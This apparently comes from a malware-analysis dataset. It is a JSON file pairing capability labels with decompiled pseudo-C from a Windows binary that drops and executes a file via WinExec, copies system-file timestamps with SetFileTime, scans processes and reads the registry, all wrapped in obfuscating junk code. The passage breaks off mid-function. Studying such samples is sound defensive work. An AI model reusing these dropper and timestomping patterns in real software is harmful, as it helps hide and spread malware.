{
    "00401000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004010d4) overlaps instruction at (ram,0x004010d2)\n// \n\nuint fcn.00401000(uint *param_1)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    ushort extraout_DX;\n    char *pcVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    ulong uVar11;\n    uint uStack523;\n    uchar uStack5;\n    char cVar4;\n    \n    // [00] -r-x section size 16384 named .text\n    puVar8 = &uStack523;\n    for (iVar5 = 0x7f; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    iVar5 = fcn.004013e0();\n    if (iVar5 == 0) {\n        return 0;\n    }\n    if (param_1 == 0xffffffff) {\n        iVar5 = fcn.00401330();\n        if (iVar5 == 0) {\n            param_1 = 0xd;\n        }\n        else {\n            param_1 = 0xc;\n        }\n    }\n    uVar11 = (**0x41e3ac)();\n    pcVar6 = uVar11 >> 0x20;\n    uVar2 = uVar11;\n    bVar10 = false;\n    bVar9 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        puVar7 = &stack0xfffffffc;\n        if ((bVar9) && (puVar7 = &stack0xfffffffc,  !bVar9)) {\n            out(*param_1, uVar11 >> 0x20);\n            do {\n                cVar4 = uVar2 >> 8;\n                in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar4 - in_AF), -in_AF);\n            } while (in_AF || cVar4 == *pcVar6);\n            piVar1 = puVar8 + pcVar6 * 2 + 3;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(extraout_ECX + -0x75) = uVar2;\n            bVar10 = SBORROW4(&stack0xfffffffc, 1);\n            puVar7 = &uStack5;\n            param_1 = param_1 + 1;\n        }\n        if ((!bVar10) && (bVar10)) {\n            LOCK();\n            param_1 = 0x138b2633;\n        }\n        (**0x41e3b4)();\n        (*_sym.imp.MSVCRT.dll_sprintf)();\n        if ((*0x10 != 0x234) && (*0x10 == 0x234)) {\n            out(*param_1, extraout_DX);\n        }\n        iVar5 = (**0x41e3b0)(0x41e3c0);\n        if (iVar5 != 0) {\n            *(puVar7 + -4) = 3000;\n            (**0x41e3a8)(iVar5, 2, puVar7 + -4, 4);\n            iVar3 = (**0x41e3a4)(iVar5, puVar7 + -0x208, 0, 0, 0x84000000, 0);\n            if (iVar3 != 0) {\n                (**0x41e3b8)(iVar3);\n                (**0x41e3b8)(iVar5);\n                return 1;\n            }\n            (**0x41e3b8)(iVar5);\n            return 0;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 938
    },
    "00401cc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d2b) overlaps instruction at (ram,0x00401d29)\n// \n\nuint __cdecl fcn.00401cc0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    uint *puVar10;\n    char cVar11;\n    char cVar12;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint var_4h;\n    \n    puVar5 = &stack0xfffffffc;\n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar6 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    cVar12 = '\\0';\n    cVar11 = '\\0';\n    var_12ch = 0;\n    puVar6 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    pcVar8 = puVar6 + 3;\n    *(puVar6 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    if ((cVar12 == cVar11) && (cVar12 != cVar11)) {\n        puVar5 = 0xfffffdd0;\n    }\n    else {\n        pcVar8 = &lpBuffer;\n    }\n    uVar3 = 0xffffffff;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar11 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar11 != '\\0');\n    uVar3 = ~uVar3;\n    puVar6 = pcVar7 + -uVar3;\n    puVar10 = puVar5 + -300;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar8 = 0x40feac;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar11 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar11 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar8 = puVar5 + -300;\n    do {\n        pcVar9 = pcVar8;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar9 = pcVar8 + 1;\n        cVar11 = *pcVar8;\n        pcVar8 = pcVar9;\n    } while (cVar11 != '\\0');\n    puVar6 = pcVar7 + -uVar3;\n    puVar10 = pcVar9 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar5 + -300, 0, puVar5 + -0x28);\n    iVar2 = *(puVar5 + 0xc);\n    if (iVar2 == -1) {\n        iVar1 = fcn.00403100(*(puVar5 + 8));\n        if (iVar1 == -1) {\n            return 0;\n        }\n    }\n    else {\n        iVar1 = *(puVar5 + -4);\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar1, puVar5 + -0x24, puVar5 + -0x1c, puVar5 + -0x14);\n    if (iVar2 == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return 1;\n}\n",
        "token_count": 1321
    },
    "00401ec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004020af) overlaps instruction at (ram,0x004020ad)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t fcn.00401ec0(uint *param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    char cVar6;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t arg_ch;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    char *pcVar8;\n    int32_t unaff_EBX;\n    uchar *puVar9;\n    uint *arg_8h;\n    uint *puVar10;\n    uint8_t uVar11;\n    bool bVar12;\n    uint8_t in_AF;\n    bool bVar13;\n    uchar uVar14;\n    uchar uVar15;\n    ulong uVar16;\n    uint64_t uVar17;\n    uchar *puStack556;\n    uint uStack552;\n    uchar uStack536;\n    uint uStack535;\n    int32_t aiStack387 [27];\n    uchar uStack276;\n    uint uStack275;\n    uint32_t uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puVar9 = &stack0xfffffffc;\n    uStack536 = 0;\n    puVar10 = &uStack535;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    uStack276 = 0;\n    puVar10 = &uStack275;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    uStack16 = 1;\n    *(puVar10 + 2) = 0;\n    uVar15 = 0;\n    puStack556 = &uStack536;\n    uStack552 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276, 0x40fe94);\n    arg_8h = param_1;\n    if ((!uVar15) && (uVar15)) {\n        LOCK();\n        arg_8h = 0x138b2633;\n    }\n    fcn.00403150(&uStack8, &uStack12);\n    uVar4 = fcn.00401a80(arg_8h, param_2, param_3, param_4, uStack8, uStack12);\n    bVar12 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 == 0) {\n        return 0;\n    }\n    if ((bVar12) || (!bVar12)) {\n        uVar4 = fcn.004049e0();\n        *0x41e3d0 = uVar4;\n    }\n    *(unaff_EBX + 0x41e3d0) = *(unaff_EBX + 0x41e3d0) + (uVar4 - 0x31 >> 8);\n    iVar7 = fcn.00403930(&uStack276, uStack8, uStack12);\n    if (iVar7 == 0) {\n        return 0;\n    }\n    fcn.00403d80();\n    iVar7 = fcn.00403c80(0x40fecc);\n    if (iVar7 == -1) {\n        iVar7 = fcn.00403c80(0x40fec0);\n        bVar12 = iVar7 != -1;\n        bVar13 = iVar7 == -1;\n        if (!bVar13) {\n            arg_8h = 0xf;\n            goto code_r0x0040206d;\n        }\n    }\n    else {\n        arg_8h = 0xe;\ncode_r0x0040206d:\n        iVar7 = fcn.00404bf0(param_1);\n        bVar12 = false;\n        bVar13 = iVar7 == 0;\n        if (!bVar13) {\n            fcn.00404450();\n            fcn.00401000();\n            return 1;\n        }\n    }\n    if ((!bVar12 && !bVar13) && (bVar12 || bVar13)) {\n        puVar10[-0x1c] = puVar10[-0x1c] - &puStack556;\n        LOCK();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar16 = fcn.00401e30(param_1, &uStack276);\n    pcVar8 = uVar16 >> 0x20;\n    uVar5 = uVar16;\n    uVar4 = uVar5 & 0xff;\n    arg_ch = uStack16;\n    if (uVar5 == 0) {\n        uVar4 = 0;\n        arg_ch = 0;\n    }\n    bVar12 = (POPCOUNT(uVar4) & 1U) == 0;\n    if ((bVar12) || (!bVar12)) {\n        uVar11 = 0;\n        bVar12 = arg_ch < 0;\n        if (arg_ch == 0) goto code_r0x004020f7;\n    }\n    else {\n        puVar10 = arg_8h + 1;\n        out(*arg_8h, uVar16 >> 0x20);\n        uVar11 = in_AF;\n        do {\n            cVar6 = uVar5 >> 8;\n            uVar11 = 9 < (uVar5 & 0xf) | uVar11;\n            uVar5 = CONCAT31(CONCAT21(uVar5 >> 0x10, cVar6 - uVar11), -uVar11);\n            arg_8h = puVar10;\n            in_AF = uVar11;\n        } while (uVar11 || cVar6 == *pcVar8);\n    }\n    piVar1 = arg_ch + pcVar8 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - uVar11;\n    *(extraout_ECX + -0x7b) = uVar5;\n    uVar4 = fcn.004034f0(*(pcVar8 * 2 + 0x53));\n    bVar12 = uVar4 < 0;\n    if (uVar4 == 0) {\n        uStack16 = 0;\n        arg_ch = uVar4;\n    }\ncode_r0x004020f7:\n    if (((!bVar12) && (bVar12)) || (arg_ch == 0)) {\n        arg_ch = fcn.00402f40(param_1, arg_ch);\n        uStack16 = arg_ch;\n    }\n    uVar15 = false;\n    puVar3 = arg_ch;\n    if (arg_ch != 0) {\n        fcn.00401000();\n        uVar15 = 0xfffffffb < &stack0xfffffdcc;\n        puVar3 = &stack0xfffffdd0;\n    }\n    uVar14 = arg_ch == 0 || *0x10 == 0x230;\n    bVar12 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n    if ((bVar12) || (!bVar12)) {\n        uVar17 = (*_sym.imp.KERNEL32.dll_Sleep)();\n        iVar7 = extraout_ECX_01;\n    }\n    else {\n        uVar11 = 0;\n        arg_8h = 0x34a96cf4;\n        puVar9 = *0x6817b43a;\n        uVar17 = func_0xff402164();\n        pcVar2 = sym.imp.KERNEL32.dll_Sleep + uVar17;\n        uVar15 = 0xffbfafc7 < uVar17 || CARRY4(pcVar2, uVar11);\n        uVar17 = uVar17 & 0xffffffff00000000 | ZEXT48(pcVar2 + uVar11);\n        uVar14 = pcVar2 + uVar11 == NULL;\n        iVar7 = extraout_ECX_00;\n    }\n    pcVar8 = uVar17 >> 0x20;\n    uVar4 = uVar17;\n    if ((!uVar14) && (uVar14)) {\n        if (uVar15 || param_1 + 1 == 0) {\n            out(*arg_8h, uVar17 >> 0x20);\n            do {\n                cVar6 = uVar4 >> 8;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                uVar4 = CONCAT31(CONCAT21(uVar4 >> 0x10, cVar6 - in_AF), -in_AF);\n            } while (in_AF || cVar6 == *pcVar8);\n            piVar1 = arg_ch + pcVar8 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(iVar7 + -0x75) = uVar4;\n            int.00401790(arg_ch, arg_8h + 1, puVar9 + 8, puVar9 + 0xc);\n            return 1;\n        }\n        in_AF = 9 < (uVar17 & 0xf) | in_AF;\n        piVar1 = (uVar4 & 0xffff0000 | CONCAT11((uVar17 >> 8) + in_AF, uVar17 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (param_1 + 1);\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x40fee0);\n    return arg_ch;\n}\n",
        "token_count": 2311
    },
    "004030c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004030e7) overlaps instruction at (ram,0x004030e3)\n// \n\nuint fcn.004030c0(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    unkbyte10 extraout_ST0;\n    ulong uVar3;\n    \n    uVar3 = fcn.00403100(0x40fe74);\n    piVar2 = uVar3 >> 0x20;\n    iVar1 = uVar3;\n    if (iVar1 != -1) {\n        if ((iVar1 < -1) || (-2 < iVar1)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n        else {\n            *(iVar1 + -0x7ce92414) = extraout_ST0;\n            *piVar2 = *piVar2 + -0xaf207c;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 212
    },
    "004036c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040377e) overlaps instruction at (ram,0x0040377a)\n// \n// WARNING: Removing unreachable block (ram,0x004037ed)\n// WARNING: Removing unreachable block (ram,0x004037f7)\n// WARNING: Variable defined which should be unmapped: var_10bh\n\nint32_t __cdecl\nfcn.004036c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t **arg_18h, uint arg_1ch, int32_t *arg_20h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t extraout_AH;\n    int32_t iVar4;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uchar uVar9;\n    char cVar10;\n    uint8_t in_IF;\n    bool bVar11;\n    float10 extraout_ST0;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    char *pcVar3;\n    \n    bVar11 = false;\n    fcn.00401bc0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 8);\n    fcn.00401bc0(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x18);\n    uVar9 = 0;\n    cVar10 = ((extraout_CH ^ extraout_AH) + 1 & 0x27) == 0;\n    while ((arg_10h = fcn.00401bc0(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0x28),  !uVar9 && (uVar9))) {\n        piVar5 = extraout_ECX + -1;\n        if (piVar5 == NULL || cVar10 == '\\0') {\ncode_r0x00403771:\n            iVar4 = *arg_20h;\n            *arg_18h = arg_20h + 1;\n            iVar6 = -0x744713bc;\n            uVar2 = *0x9750e2b5 + -0x73 + uVar9;\n            pcVar3 = *0x9750e2b5 & 0xffffff00 | uVar2;\n            *pcVar3 = *pcVar3 + uVar2;\n            uVar2 = iVar4 >> 0x1f;\n            *(piVar5 + 0x6a) = *(piVar5 + 0x6a) + uVar2;\n            puVar1 = (iVar4 >> 0x1f) + 0x53;\n            *puVar1 = *puVar1 & uVar2;\n            fcn.00401bc0(arg_18h, &stack0xfffffffc, in_stack_fffffec0, in_stack_fffffec4, in_stack_fffffec8);\n            if ((*0x10 != 0x120) && (*0x10 == 0x120)) {\n                bVar11 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n            }\n            iVar4 = fcn.00403670();\n            if (iVar4 == -1) {\n                iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n                *0x8bb8ed64 = iVar4 % 5;\n            }\n            else {\n                *0x8bb8ed64 = iVar4;\n            }\n            var_10ch = 0;\n            puVar7 = &var_10bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + bVar11 * -2 + 1;\n            }\n            puVar8 = puVar7 + bVar11 * -4 + 2;\n            *puVar7 = 0;\n            var_4h = 0x104;\n            *puVar8 = 0;\n            iVar4 = fcn.00401210(0x80000001, 0x410100, 0x41012c, &var_8h, &var_10ch, &var_4h);\n            if (iVar4 != 0) {\n                iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)();\n                if (iVar4 == 0) {\n                    if ((-1 < iVar4) && (-1 >= iVar4)) {\n                        *(puVar8 + bVar11 * -8 + bVar11 * -2 + 0x1d) = extraout_ST0;\n                        iVar6 = bVar11 * -8 + -0x744713b7 + bVar11 * -2;\n                    }\n                    *(iVar6 + 0x120) = *(iVar6 + 0x120) | 0x80;\n                }\n            }\n            return iVar4;\n        }\n    }\n    piVar5 = arg_20h + 0x38;\n    in_stack_fffffec8 = 0x20;\n    in_stack_fffffec0 = arg_1ch;\n    in_stack_fffffec4 = arg_14h;\n    goto code_r0x00403771;\n}\n",
        "token_count": 1257
    },
    "00403870": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004038b7) overlaps instruction at (ram,0x004038b3)\n// \n// WARNING: Removing unreachable block (ram,0x004038d7)\n\nuint __cdecl fcn.00403870(uint arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char extraout_CH;\n    ulong uVar5;\n    \n    uVar5 = fcn.00403c80(0x40fee0);\n    if (uVar5 == -1) {\n        return 0;\n    }\n    pcVar1 = (uVar5 >> 0x20) + 0x40;\n    *pcVar1 = *pcVar1 + extraout_CH;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar2, 0, 0, 0, 2);\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar3);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 313
    },
    "00403930": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403930(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*0x41e3d0 != 0) {\n        iVar1 = fcn.00403870(arg_8h_00);\n        *0x41e3d0 = iVar1 == 0;\n    }\n    fcn.00401cc0(0, arg_8h_00);\n    if (*0x41e3d0 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 282
    },
    "00403c80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c80(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint hObject;\n    \n    hObject = 0xffffffff;\n    iVar3 = (**0x41e3c4)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (**0x41e3c8)(iVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar1 = hObject;\n    while( true ) {\n        hObject = uVar1;\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return uVar1;\n        }\n        iVar4 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar4 == 0) break;\n        iVar4 = (**0x41e3cc)(iVar3, &var_12ch);\n        uVar1 = hObject;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    return var_124h;\n}\n",
        "token_count": 376
    },
    "004049e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a23) overlaps instruction at (ram,0x00404a1e)\n// \n// WARNING: Removing unreachable block (ram,0x00404a0e)\n// WARNING: Removing unreachable block (ram,0x00404a16)\n\nbool fcn.004049e0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar auStack532 [260];\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    uStack272 = 0;\n    uStack8 = 0x104;\n    puVar3 = &uStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = fcn.00401210(0x80000002, 0x4102e4, 0x410324, auStack12, auStack532, &uStack8);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(auStack532, 0);\n    if (iVar2 == -1) {\n        return false;\n    }\n    iVar2 = fcn.004048a0(auStack532, &uStack272);\n    pcVar1 = _sym.imp.MSVCRT.dll_strstr;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(&uStack272, 0x41033c);\n        if (iVar2 == 0) {\n            iVar2 = (*pcVar1)(&uStack272, 0x410340);\n            return iVar2 != 0;\n        }\n        return true;\n    }\n    return false;\n}\n",
        "token_count": 457
    },
    "00404b20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b20(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar **ppuVar4;\n    uchar **ppuVar5;\n    bool in_ZF;\n    uchar *apuStack16 [2];\n    \n    puVar3 = &stack0xfffffffc;\n    ppuVar5 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar5 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar4 = apuStack16 + 1;\n        ppuVar5 = apuStack16 + 1;\n        cVar1 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            ppuVar4 = ppuVar4 + -1;\n            *ppuVar4 = *puVar3;\n            cVar1 = cVar1 + -1;\n            apuStack16[1] = &stack0xfffffffc;\n        } while ('\\0' < cVar1);\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(*(ppuVar5 + 8), 0);\n    if (iVar2 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 289
    },
    "null": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401a00": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nint64_t fcn.00401a00(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 152
    },
    "00401630": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401664)\n\nint32_t __cdecl fcn.00401630(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = arg_8h;\n    arg_8h = arg_ch;\n    if (arg_10h != 0) {\n        arg_ch = arg_10h;\n        do {\n            uVar1 = uVar1 + *arg_8h;\n            if (uVar1 >> 0x10 != 0) {\n                uVar1 = (uVar1 >> 0x10) + (uVar1 & 0xffff);\n            }\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != NULL);\n    }\n    return (uVar1 >> 0x10) + uVar1;\n}\n",
        "token_count": 215
    },
    "00401790": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401881) overlaps instruction at (ram,0x0040187f)\n// \n\nint32_t * __cdecl int.00401790(uint arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    char in_DL;\n    uint16_t uVar8;\n    int32_t unaff_ESI;\n    int32_t iVar9;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    bool bVar10;\n    bool in_ZF;\n    bool in_OF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (in_OF) {\n            *(unaff_ESI + 0x33) = *(unaff_ESI + 0x33) + in_DL + in_CF;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar5 = fcn.00401630(0, arg_8h, arg_ch + 1U >> 1);\n    uVar5 = uVar5 & 0xffff;\n    piVar6 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar3 = piVar6[0x16];\n    if ((piVar6 < unaff_EDI) && (unaff_EDI <= piVar6)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar4 = uVar3;\n    uVar8 = uVar5;\n    if (uVar8 < uVar4) {\n        if ((uVar8 <= uVar4) || (uVar4 < uVar8)) {\n            uVar5 = uVar5 - uVar3;\n        }\n        iVar9 = (uVar5 & 0xffff) - 1;\n    }\n    else {\n        iVar9 = uVar5 - (uVar3 & 0xffff);\n    }\n    piVar7 = uVar3 >> 0x10;\n    bVar10 = iVar9 < uVar3 >> 0x10;\n    if (bVar10) {\n        if ((bVar10) || (!bVar10)) {\n            